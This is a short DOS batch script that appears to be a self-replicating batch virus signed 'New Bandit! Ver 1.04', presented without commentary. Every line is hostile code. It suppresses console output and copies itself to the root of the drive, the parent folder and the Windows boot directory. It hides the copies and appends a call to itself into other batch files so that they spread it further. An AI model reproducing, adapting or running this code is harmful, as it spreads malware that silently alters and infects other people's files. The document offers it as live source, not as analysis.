@ctty nul
if "%0"=="bandit.bat" goto bandit
:Not
copy %0 c:\bandit.bat
attrib c:\bandit.bat +h
copy %0 %1
attrib bandit.bat +h
:contin
attrib c:\bandit.bat +h
attrib bandit.bat +h
for %%i in (..\*.b?t *.b?t) do set btn=%%i
copy %0 ..
copy %0 %winbootdir%\%0
attrib %btn% -r
attrib %0 +r
for %%f in (*.bat) do find "call c:\bandit.bat" %%f
if not errorlevel 1 exit
echo. >> %btn%
echo call c:\bandit.bat >> %btn%
echo exit >> %btn%
goto end
:bandit
for %%f in (*.bat) do find "call c:\bandit.bat" %%f
if not errorlevel 1 exit
@ctty con
echo (c) New Bandit! Ver 1.04
del bandit.bat
:end